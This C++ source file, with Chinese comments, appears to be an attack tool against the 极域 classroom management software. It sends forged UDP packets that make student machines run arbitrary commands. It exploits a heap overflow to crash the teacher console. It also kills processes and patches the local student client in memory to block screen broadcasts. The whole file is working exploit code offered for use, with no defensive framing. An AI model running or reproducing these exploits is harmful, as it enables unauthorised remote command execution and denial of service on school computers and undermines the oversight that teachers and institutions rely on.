#include "declaration.h"

WSAData wsd;
SOCKET soSend;
WCHAR* wcommandData = (WCHAR*)&commandData;
SOCKADDR_IN serverAddr{};
std::string ip = "127.0.0.1";

bool initialization() {//初始化
	srand(time(NULL));
	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) {
		std::cout << "启动Winsock失败! #" << WSAGetLastError() << "\n";
		return false;
	}
	soSend = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (soSend == SOCKET_ERROR) {
		std::cout << "创建socket失败!#" << WSAGetLastError() << "\n";
		return false;
	}
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(4705);
	inet_pton(AF_INET, ip.data(), (void*)&serverAddr.sin_addr.s_addr);
	return true;
}

bool isValidIP(std::string ip) {
	std::regex ipPattern(R"(^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$)");
	return regex_match(ip, ipPattern);
}

bool setip(std::wstring command) {//设置远程执行目标ip
	if (!_wcsicmp(getCommand(command, 1).data(),L"setip")) {
		if (!isValidIP(wstringToString(getCommand(command, 2)))) {
			std::cout << "非法的ip!\n";
			return false;
		}
		ip = wstringToString(getCommand(command, 2));
		inet_pton(AF_INET, ip.data(), (void*)&serverAddr.sin_addr.s_addr);
		std::cout << "ip设置为:" << ip << "\n";
		return true;
	}
	return false;
}
bool killTeacher(std::wstring command) {//利用教师端堆溢出漏洞覆写堆中指针引发读写异常
	if (!_wcsicmp(getCommand(command, 1).data(),L"killtc")) {
		std::string ip = wstringToString(getCommand(command, 2));
		if (!isValidIP(ip)) {
			std::cout << "非法的ip!\n";
			return false;
		}
		WSADATA wsData;
		WORD ver = MAKEWORD(2, 2);
		int wsResult = WSAStartup(ver, &wsData);
		if (wsResult != 0) {
			std::cout << "启动Winsock失败! #" << wsResult << "\n";
			return false;
		}
		SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sock == INVALID_SOCKET) {
			std::cout << "创建socket失败! #" << WSAGetLastError() << "\n";
			WSACleanup();
			return false;
		}
		sockaddr_in hint;
		hint.sin_family = AF_INET;
		hint.sin_port = htons(4806);
		inet_pton(AF_INET, ip.data(), &hint.sin_addr);
		int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
		if (connResult == SOCKET_ERROR) {
			std::cout << "链接失败！#" << WSAGetLastError() << "\n";
			closesocket(sock);
			WSACleanup();
			return false;
		}
		int sendResult1 = send(sock, killTeacherData1, 12, 0);
		int sendResult2 = send(sock, killTeacherData2, 576, 0);
		if (sendResult1 == SOCKET_ERROR || sendResult2 == SOCKET_ERROR) {
			std::cerr << "发送失败! #" << WSAGetLastError() << "\n";
			closesocket(sock);
			WSACleanup();
			return false;
		}
		std::cout << "ok!\n";
		closesocket(sock);
		WSACleanup();
		return true;
	}
	return false;
}

bool executeCommand(std::wstring command) {//学生端远程执行
	std::wstring execute = L"";
	if (!_wcsicmp(getCommand(command, 1).data(),L"command")) {
		if ((getCommand(command, 1).find(L"command") + 8) < command.size()) {
			execute = command.substr(getCommand(command, 1).find(L"command") + 8);
		}
		if (execute.size() > 162) {
			std::cout << "命令超出长度限制!\n";
			return false;
		}
		else {
			for (int i = 0; i < 162 && i < execute.size(); i++) {
				*(wcommandData + 286 + i) = execute[i];
			}
			for (int i = 12; i <= 27; i++) {
				commandData[i] = rand() % 256;
			}
			commandData[34] = rand() % 256;
			commandData[35] = rand() % 256;
			if (sendto(soSend, commandData, 906, 0, (SOCKADDR*)&serverAddr, sizeof(SOCKADDR)) < 0) {
				std::cout << "发送失败! #" << WSAGetLastError() << "\n";
			}
			else {
				std::cout << "发送成功!\n";
			}
			for (int i = 0; i < 324; i++) {
				commandData[572 + i] = 0;
			}
		}
		return true;
	}
	return false;
}

bool setbc(std::wstring command) {//设置目标广播状态
	if (!_wcsicmp(getCommand(command, 1).data(),L"setbc")) {
		if (!_wcsicmp(getCommand(command, 2).data(),L"-f")) {
			broadcastTypeData[52] = 0x01;
		}
		else if (!_wcsicmp(getCommand(command, 2).data(),L"-s")) {
			broadcastTypeData[52] = 0x00;
		}
		else {
			std::cout << "错误的参数!\n";
			return false;
		}
		if (!isValidIP(wstringToString(getCommand(command, 3)).data())) {
			std::cout << "非法的ip!\n";
			return false;
		}
		SOCKADDR_IN setBroadcastTypeAddr{};
		setBroadcastTypeAddr.sin_family = AF_INET;
		setBroadcastTypeAddr.sin_port = htons(4705);
		inet_pton(AF_INET, wstringToString(getCommand(command, 3)).data(), (void*)&setBroadcastTypeAddr.sin_addr.s_addr);
		for (int i = 12; i <= 27; i++) {
			broadcastTypeData[i] = rand() % 256;
		}
		if (sendto(soSend, broadcastTypeData, 226, 0, (SOCKADDR*)&setBroadcastTypeAddr, sizeof(SOCKADDR)) < 0) {
			std::cout << "发送失败! #" << WSAGetLastError() << "\n";
			return false;
		}
		else {
			std::cout << "ok!\n";
		}
		return true;
	}
	return false;
}

bool setfile(std::wstring command) {//设置执行文件路径
	if (!_wcsicmp(getCommand(command, 1).data(),L"setfile")) {
		std::wstring file = command.substr(getCommand(command, 1).find(L"setfile") + 8);
		if (file.size() > 256) {
			std::cout << "路径超出长度限制!\n";
			return false;
		}
		for (int i = 0; i < 256; i++) {
			*(wcommandData + 30 + i) = 0;
		}
		for (int i = 0; i < 256 && i < file.size() * 2; i++) {
			*(wcommandData + 30 + i) = file[i];
		}
		return true;
	}
	return false;
}

bool killStudentMain() {//干掉本地学生端
	DWORD pid = 0;
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hSnapshot, &pe)) {
		do {
			if (!_wcsicmp(pe.szExeFile, L"studentmain.exe")) {
				pid = pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	if (pid == 0) {
		std::cout << "未找到进程！\n";
		return 0;
	}
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess) {
		if (TerminateProcess(hProcess, 0)) {
			std::cout << "已结束studentmain.exe\n";
			return true;
		}
		else {
			std::cout << "无法结束进程！\n";
			return false;
		}
	}
	else {
		std::cout << "句柄打开失败！\n";
		return false;
	}
	return false;
}

bool restartStudentMain() {//重启本地学生端
	std::cout << "正在重启进程StudentMain.exe\n";
	DWORD pid = 0;
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hSnapshot, &pe)) {
		do {
			if (!_wcsicmp(pe.szExeFile, L"studentmain.exe")) {
				pid = pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	if (pid == 0) {
		std::cout << "未找到进程！\n";
		return false;
	}
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	TCHAR szProcessPath[MAX_PATH];
	if (hProcess) {
		if (GetModuleFileNameEx(hProcess, NULL, szProcessPath, MAX_PATH) != 0) {
			if (TerminateProcess(hProcess, 0)) {
				STARTUPINFOW si;
				PROCESS_INFORMATION pi;
				ZeroMemory(&si, sizeof(STARTUPINFOW));
				si.cb = sizeof(STARTUPINFOW);
				si.lpDesktop = (LPWSTR)L"winsta0\\default";
				if (!CreateProcess(NULL, szProcessPath, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
					std::cout << "启动StudentMain.exe进程失败！\n";
					return false;
				}
				else {
					return true;
				}
			}
			else {
				std::cout << "无法结束进程！\n";
				return false;
			}
		}
		else {
			std::cout << "获取执行文件路径失败！\n";
			return false;
		}
	}
	else {
		std::cout << "句柄打开失败！\n";
		return false;
	}
	return false;
}
int banBroadcastFull() {//通过修改内存禁止本地学生端全屏广播，仅针对极域V6_2016版，其他版本内存偏移可能发生变化
	DWORD pid = 0;
	HANDLE hSnapshot = NULL;
	if (!restartStudentMain()) {
		std::cout << "重启studentmain.exe失败!\n";
		return false;
	}
	std::cout << "正在查找进程StudentMain.exe\n";
	while (!pid) {
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (!_wcsicmp(pe.szExeFile, L"studentmain.exe")) {
					pid = pe.th32ProcessID;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
	}
	std::cout << "已找到进程StudentMain.exe\n";
	CloseHandle(hSnapshot);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) {
		std::cout << "句柄打开失败！\n";
		return false;
	}
	HMODULE hModuleArray[1024];
	DWORD cbNeeded;
	for (int i = 1; i <= 20; i++) {
		Sleep(100);
		if (EnumProcessModules(hProcess, hModuleArray, sizeof(hModuleArray), &cbNeeded)) {
			MODULEINFO moduleInfo;
			for (int i = 1; i <= 10; i++) {
				if (GetModuleInformation(hProcess, hModuleArray[0], &moduleInfo, sizeof(MODULEINFO))) {
					unsigned char value1 = 0xeb;
					if (WriteProcessMemory(hProcess, (PBYTE*)((long)moduleInfo.lpBaseOfDll + 0x32104), (PBYTE*)&value1, sizeof(value1), NULL)) {
						std::cout << "内存基址:"<< std::hex << (long)moduleInfo.lpBaseOfDll << "\n内存改写成功！\n";
						CloseHandle(hProcess);
						return true;
					}
					else {
						std::cout << "内存写入失败!\n";
					}
					CloseHandle(hProcess);
				}
				Sleep(100);
			}
			std::cout << "获取模块基址失败!\n";
			CloseHandle(hProcess);
			return false;
		}
	}
	std::cout << "获取模块信息失败!\n";
	CloseHandle(hProcess);
	return false;
}
